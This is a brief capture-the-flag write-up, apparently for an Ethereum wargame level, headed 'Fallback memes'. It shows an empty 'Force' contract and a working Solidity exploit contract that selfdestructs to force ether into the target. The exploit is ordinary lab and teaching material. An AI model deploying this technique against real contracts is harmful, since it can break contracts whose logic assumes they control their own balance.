## Fallback memes

### Contract

<details><summary>CLICK TO VIEW</summary>
<p>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

</p>
</details>

### Solution

Ah ha. Famous challenge! If you've read the documentation on Ethereum, you might have seen the following notice:

![ETH docs image](https://i.imgur.com/rgrWc17.png)

Hence, because I was too lazy to do any sort of block mining (if even that was possible in the first place?), I decided to opt in for the easy strat: 
self destruction. I quickly mashed up the following smart contract:

```solidity
contract Exploit {
    address public delegate;

    constructor (address delegate_) public payable {
        delegate = delegate_;
    }

    function exploit() public {
        address payable addr = payable(delegate);
        selfdestruct(addr);
    }
}
```

I then pushed the contract with 0.01 ETH to give it a bit of value, then proceeded to run the exploit, effectively self destructing and sending all the ethereum
to our target contract. Mission success. 
